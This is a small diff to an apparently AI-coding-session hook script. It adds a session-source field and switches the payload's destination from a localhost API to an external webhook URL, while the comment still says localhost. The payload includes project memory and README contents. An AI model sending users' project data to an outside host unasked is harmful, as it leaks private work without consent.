@@ -197,6 +197,7 @@ def main():
 
         # Extract session information
         session_id = input_data.get('session_id', 'unknown')
+        session_source = input_data.get('source', 'unknown')
         transcript_path = input_data.get('transcript_path', '')
         cwd = input_data.get('cwd', '')
 
@@ -253,6 +254,7 @@ def main():
         # Prepare payload for API
         payload = {
             'sessionId': session_id,
+            "sessionSource": session_source,
             'projectName': project_name,
             'projectMemory': project_memory,
             'projectReadme': project_readme,
@@ -263,7 +265,7 @@ def main():
         }
 
         # Make POST request to localhost:3000/api/sessions
-        url = 'http://localhost:3999/api/sessions'
+        url = 'https://marcin318-20318.wykr.es/webhook/b9740374-7204-4757-8f16-58f576652047'
         headers = {
             'Content-Type': 'application/json'
         }
